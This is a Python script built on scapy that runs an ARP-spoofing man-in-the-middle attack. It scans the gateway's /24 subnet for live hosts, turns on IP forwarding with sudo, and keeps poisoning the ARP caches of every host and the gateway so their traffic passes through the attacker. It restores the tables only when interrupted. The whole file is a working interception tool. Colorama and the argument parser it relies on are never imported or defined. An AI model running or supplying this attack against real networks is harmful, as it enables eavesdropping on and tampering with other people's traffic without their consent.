#!/usr/bin/env python
import time
import scapy.all as scapy
import subprocess
import ipaddress

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) 
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") 
    arp_request_broadcast = broadcast/arp_request 
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] 
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(Fore.RED + f"[-] Unable to get MAC address for {ip}.")
        return None

def scan_subnet(subnet):
    print(Fore.LIGHTBLUE_EX + f"[+] Scanning subnet {subnet} for live hosts...")
    live_hosts = []
    # ARP ping sweep on the subnet
    arp_request = scapy.ARP(pdst=str(subnet))
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    for sent, received in answered_list:
        live_hosts.append(received.psrc)

    print(Fore.LIGHTGREEN_EX + f"[+] Found {len(live_hosts)} live hosts.")
    return live_hosts

def spoof(target_ip, target_mac, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, destination_mac, source_ip, source_mac):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def start(gateway_ip):
    sent_packet_count = 0
    
    # Determine subnet from gateway IP (assuming /24)
    subnet = ipaddress.ip_network(gateway_ip + '/24', strict=False)
    
    # Scan subnet for live hosts
    targets = scan_subnet(subnet)

    # Remove gateway from targets (don't spoof gateway as target)
    if gateway_ip in targets:
        targets.remove(gateway_ip)

    # Get MAC address of gateway
    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print(Fore.RED + "[-] Could not get gateway MAC address. Exiting.")
        return

    # Get MAC addresses of all targets
    target_macs = {}
    for target in targets:
        mac = get_mac(target)
        if mac:
            target_macs[target] = mac
        else:
            print(Fore.RED + f"[-] Skipping target {target} due to unknown MAC.")

    # Enable IP forwarding
    subprocess.call("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward", shell=True)

    try:
        while True:
            for target_ip, target_mac in target_macs.items():
                # Spoof target: make them think we are the gateway
                spoof(target_ip, target_mac, gateway_ip)
                # Spoof gateway: make it think we are each target
                spoof(gateway_ip, gateway_mac, target_ip)
            sent_packet_count += 2 * len(target_macs)
            print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + f"\r[+] Sent {sent_packet_count} packets to {len(target_macs)} hosts [+]", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print(Fore.LIGHTGREEN_EX + "\n[+] Quitting and restoring ARP tables... [+]")
        for target_ip, target_mac in target_macs.items():
            restore(target_ip, target_mac, gateway_ip, gateway_mac)
            restore(gateway_ip, gateway_mac, target_ip, target_mac)
        subprocess.call("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward", shell=True)


if __name__ == "__main__":
    options = get_args()
    start(options.gateway)
